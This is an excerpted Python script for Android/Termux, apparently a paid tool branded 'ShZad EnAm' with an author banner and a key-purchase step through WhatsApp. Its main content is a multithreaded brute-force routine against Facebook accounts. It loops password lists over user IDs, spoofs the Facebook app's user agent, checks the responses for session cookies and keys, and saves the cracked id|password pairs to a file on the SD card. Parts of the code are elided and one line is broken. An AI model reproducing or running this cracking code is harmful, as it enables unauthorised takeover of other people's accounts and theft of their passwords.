#OPEN SOURCE BY Sayed Enaamullah Maasomy 
#LOLI KINGðŸ˜¹
from os import path
...
----------------------------------------------
 Author    : ShZad EnAm
 Github    : EnAm001
 Facebook  : Mr. EnAm. 002
 Tool Name : ShZad EnAm
 Tool type : PAID
----------------------------------------------
        ...
        try:
                ...
                if kex in link:
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'https://www.facebook.com/profile.php?id=100085997807979');menu()
                        elif xd in ['7','07']:
                        ...
                        linex()
                        tks = ("Hi ShZad EnAm Sir, I Need To Buy Your Paid EnAm PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python ShZad.py')
                        linex()
                        exit()
        except ValueError:
                exit()
...
def pak():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ...
                                ShZad.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [EnAm-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [EnAm-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/EnAm-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080
